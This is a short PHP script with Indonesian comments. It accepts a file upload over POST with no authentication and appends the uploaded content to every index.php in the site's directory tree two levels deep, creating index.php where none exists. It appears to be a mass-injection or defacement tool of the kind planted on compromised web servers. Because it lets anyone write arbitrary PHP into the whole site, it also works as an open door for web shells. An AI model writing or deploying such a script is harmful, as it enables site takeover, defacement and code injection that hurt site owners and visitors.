<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $targetDir = __DIR__; // Direktori root tempat script ini berada.
    $uploadedFile = $_FILES['html_file']['tmp_name'];

    if (!is_uploaded_file($uploadedFile)) {
        die("File tidak valid.");
    }

    // Membaca isi file yang diunggah
    $fileContent = file_get_contents($uploadedFile);

    // Mendapatkan sub-folder hingga 2 tingkat saja
    function getLimitedFolders($dir, $depth = 2, $currentDepth = 0)
    {
        $folders = [];
        if ($currentDepth >= $depth) {
            return $folders;
        }

        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }

            $path = $dir . DIRECTORY_SEPARATOR . $item;
            if (is_dir($path)) {
                $folders[] = $path;
                $folders = array_merge($folders, getLimitedFolders($path, $depth, $currentDepth + 1));
            }
        }

        return $folders;
    }

    $folders = getLimitedFolders($targetDir);

    // Menyimpan file ke setiap folder dan memodifikasi file index.php
    foreach ($folders as $folder) {
        $targetFile = $folder . DIRECTORY_SEPARATOR . 'index.php';

        // Jika file index.php sudah ada, tambahkan konten ke dalamnya
        if (file_exists($targetFile)) {
            file_put_contents($targetFile, "\n" . $fileContent, FILE_APPEND);
        } else {
            // Jika file index.php belum ada, buat file baru
            file_put_contents($targetFile, $fileContent);
        }
    }

    echo "Proses selesai. File berhasil diproses hingga 2 tingkat sub-folder.";
} else {
    echo "Gunakan metode POST untuk menjalankan script ini.";
}
